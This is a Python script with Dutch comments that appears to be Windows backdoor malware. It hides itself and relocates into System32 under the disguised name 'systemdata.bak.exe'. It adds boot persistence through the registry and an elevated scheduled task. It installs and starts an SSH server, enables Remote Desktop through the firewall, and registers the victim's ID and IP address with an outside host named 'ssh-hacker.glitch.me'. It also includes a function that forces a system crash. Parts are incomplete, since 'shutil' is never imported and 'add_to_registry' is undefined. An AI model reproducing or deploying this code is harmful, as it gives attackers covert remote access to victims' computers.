import os
import sys
import requests
import random
import subprocess
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
import ctypes

def install_ssh():
    """Installeer en configureer de SSH-server op Windows"""
    os.system("powershell.exe -Command \"Start-Process PowerShell -ArgumentList 'Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0' -Verb RunAs\"")
    os.system("powershell.exe -Command \"Start-Process PowerShell -ArgumentList 'Start-Service sshd' -Verb RunAs\"")
    os.system("powershell.exe -Command \"Start-Process PowerShell -ArgumentList 'Set-Service -Name sshd -StartupType Automatic' -Verb RunAs\"")
    print("SSH is geïnstalleerd en gestart")

def hide_file(file_path):
    """Maakt een bestand verborgen voor Windows Explorer en Windows Search."""
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)

    print(f"Bestand verborgen: {file_path}")

def create_startup_task(script_path):
    """Maak een taak aan om het script automatisch te laten starten bij het opstarten van Windows"""
    with open('startup.bat', 'w') as f:
        f.write(f'python {script_path}\n')
    os.system("powershell.exe -Command \"Start-Process PowerShell -ArgumentList 'schtasks /create /tn MyScript /tr C:\\path\\to\\your\\startup.bat /sc onlogon /rl highest' -Verb RunAs\"")

def generate_random_client_id():
    """Genereer een willekeurige client_id van 8 cijfers"""
    return ''.join([str(random.randint(0, 9)) for _ in range(8)])

def register_client(client_id, friendly_name):
    """Voeg de client toe aan de MongoDB database via de API"""
    url = "http://ssh-hacker.glitch.me/register-client"
    data = {
        "clientId": client_id,
        "friendlyName": friendly_name
    }
    try:
        response = requests.post(url, json=data)
        if response.status_code == 201:
            print("Client geregistreerd in MongoDB.")
        else:
            print(f"Fout bij registreren client: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error registering client: {e}")

def raise_hard_error():
    """Verhoogt een harde fout op Windows"""
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )
    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

def enable_rdc():
    subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", 
                    "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"], shell=True)
import socket

def get_local_ip():
    """Haalt het lokale IP-adres van de client op."""
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def send_ip_to_server(ip):
    """Stuurt het IP-adres naar je webapp backend."""
    server_url = "http://ssh-hacker.glitch.me/register-ip"
    data = {"client_ip": ip}
    requests.post(server_url, json=data)

def main():
    script_path = os.path.abspath(__file__)

    # 🔒 Verberg het bestand zodat Windows Search het niet ziet
    hide_file(script_path)

    # 🚀 Verplaats naar System32 en hernoem naar systemdata.bak.exe
    destination_folder = "C:\\Windows\\System32"
    new_exe_path = os.path.join(destination_folder, "systemdata.bak.exe")
    shutil.move(script_path, new_exe_path)

    # 🏗 Voeg toe aan Windows Register zodat het start bij boot
    add_to_registry(new_exe_path)

    # 🔄 Maak een startup taak (optioneel)
    create_startup_task(new_exe_path)

    # 🔧 Installeer en configureer SSH
    install_ssh()

    # 🎲 Genereer en registreer client ID
    client_id = generate_random_client_id()
    friendly_name = ""  # Huidige naam leeg
    register_client(client_id, friendly_name)
    
    client_ip = get_local_ip()
    send_ip_to_server(client_ip)
    enable_rdc()


if __name__ == "__main__":
    main()
